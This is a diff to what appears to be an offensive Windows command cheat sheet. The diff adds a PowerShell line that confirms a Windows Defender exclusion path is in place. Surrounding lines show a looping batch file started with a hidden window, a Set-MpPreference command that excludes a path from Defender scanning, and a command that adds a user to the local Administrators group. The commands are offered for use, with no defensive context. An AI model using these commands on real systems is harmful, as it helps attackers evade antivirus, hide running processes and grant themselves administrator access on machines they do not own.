@@ -128,6 +128,8 @@ echo goto loop  >> nihbtdtdow.bat
 powershell -c "Start-Process -FilePath "%temp%\nihbtdtdow.bat" -WindowStyle Hidden"
 ---------------------------------------------------------------------------------------------------------------
 powershell Set-MpPreference -ExclusionPath <path> with administrator privs
+to verify it was excluded 
+powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
 net localgroup Administrators /add <username> with administrator privs
 ---------------------------------------------------------------------------------------------------------------
